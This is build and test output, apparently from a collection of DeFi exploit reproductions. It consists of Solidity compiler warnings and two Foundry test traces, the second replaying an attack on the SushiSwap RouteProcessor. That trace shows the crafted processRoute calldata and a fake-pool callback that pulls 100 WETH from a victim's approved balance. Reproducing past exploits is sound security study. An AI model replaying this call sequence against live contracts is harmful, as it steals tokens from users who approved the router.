Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-04/Sushi_Router_exp.sol:44:5:
   |
44 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 261.26ms (591.82µs CPU time)

Ran 1 test for src/test/2023-04/Sushi_Router_exp.sol:SushiExp
[PASS] testExp() (gas: 73999)
Logs:
  WETH balance before attack: 0

  WETH balance after  attack: 100000000000000000000


Traces:
  [79599] SushiExp::testExp()
    ├─ [2534] WETH::balanceOf(SushiExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("WETH balance before attack: %d\n", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [58920] 0x044b75f554b886A065b9567891e45c79542d7357::processRoute(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 0, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 0, 0x0000000000000000000000000000000000000000, 0x01514910771af9ca656af840dff83e8264ecf986ca010000017fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000)
    │   ├─ [2655] LINK::balanceOf(0x044b75f554b886A065b9567891e45c79542d7357) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [36848] SushiExp::swap(0x0000000000000000000000000000000000000000, false, 0, 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000514910771af9ca656af840dff83e8264ecf986ca000000000000000000000000044b75f554b886a065b9567891e45c79542d7357)
    │   │   ├─ [32833] 0x044b75f554b886A065b9567891e45c79542d7357::uniswapV3SwapCallback(100000000000000000000 [1e20], 0, 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000031d3243cfb54b34fc9c73e1cb1137124bd6b13e1)
    │   │   │   ├─ [30125] WETH::transferFrom(0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1, SushiExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20])
    │   │   │   │   ├─ emit Transfer(from: 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1, to: SushiExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000000 [1e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0, 0
    │   └─ ← [Return] 0
    ├─ [534] WETH::balanceOf(SushiExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 100000000000000000000 [1e20]
    ├─ [0] console::log("WETH balance after  attack: %d\n", 100000000000000000000 [1e20]) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 291.77ms (2.74ms CPU time)

Ran 2 test suites in 294.18ms (553.03ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
